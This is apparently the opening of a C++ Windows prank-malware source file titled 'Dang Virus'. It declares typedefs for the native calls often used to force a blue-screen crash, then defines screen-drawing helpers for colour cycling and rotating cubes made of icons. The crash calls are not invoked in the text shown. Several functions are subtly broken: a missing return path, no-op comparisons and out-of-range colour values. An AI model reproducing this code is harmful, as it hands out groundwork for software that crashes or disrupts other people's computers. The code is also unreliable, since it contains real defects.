// Dang Virus
#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma warning(disable : 4996)
#include <math.h>
#include <time.h>
#include <iostream>
#define M_PI 3.14159265358979323846264338327950288
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <cstdlib>
//header bsod
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
// something function
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace HSL2A {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB2() {//remake by P. ĐĂNG
	int clr = rand() % 6;
	if (clr == 0) return RGB(123, 123, 0);
	if (clr == 1) return RGB(0, 123, 123);
	if (clr == 2) return RGB(0, 0, 123);
	if (clr == 3) return RGB(112, 0, 444);
	if (clr == 4) return RGB(216, 246, 0);
	if (clr == 5) return RGB(0, 246, 444);
}

typedef struct {
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

namespace HSV2 {
	RGBQUAD HSVtoRGB(HSV hsv) {
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);
		switch (hi) {
		case 0:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
		case 1:
			return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
		case 2:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
		case 3:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
		case 4:
			return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
		default:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad) {
		HSV hsv;
		double rd = rgbquad.rgbRed / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue / 255.0;
		double cmax = max(max(rd, gd), bd);
		double cmin = min(min(rd, gd), bd);
		double delta = cmax - cmin;
		hsv.v = cmax;
		if (cmax > 0.0) hsv.s = delta / cmax;
		else hsv.s = 0.0;
		if (delta > 0.0) {
			if (cmax == rd) hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd) hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd) hsv.h = 60.0 * ((rd - gd) / delta + 4.0);
			if (hsv.h < 0.0) hsv.h += 360.0;
		}
		else {
			hsv.h = 0.0;
		}
		return hsv;
	}
}

namespace Math
{
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * sin(2 * M_PI * b * c / d);
	}
}

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);
int shakeIntensity = 1;
int warpIntensity = 3;
bool random = true;
double intensity = 0.0;
bool state = false;

typedef struct {
	float x;
	float y;
	float z;
} VERTEX;

typedef struct {
	int vtx0;
	int vtx1;
} EDGE;

COLORREF COLORHSL(int length) {
	double h = fmod(length, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c; g1 = x; b1 = 0;
	}
	else if (h < 120) {
		r1 = x; g1 = c; b1 = 0;
	}
	else if (h < 180) {
		r1 = 0; g1 = c; b1 = x;
	}
	else if (h < 240) {
		r1 = 0; g1 = x; b1 = c;
	}
	else if (h < 300) {
		r1 = x; g1 = 0; b1 = c;
	}
	else {
		r1 = c; g1 = 0; b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}

struct Point3D {
	float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
	HBRUSH brush = CreateSolidBrush(color);
	SelectObject(hdc, brush);
	DrawIcon(hdc, x - 20, y - 20, LoadIcon(NULL, MAKEINTRESOURCE(32512 + (rand() % 7))));
	DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y; point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x; point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x; point.y = y;
	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		COLORREF color = COLORHSL(colorA);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY, color);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}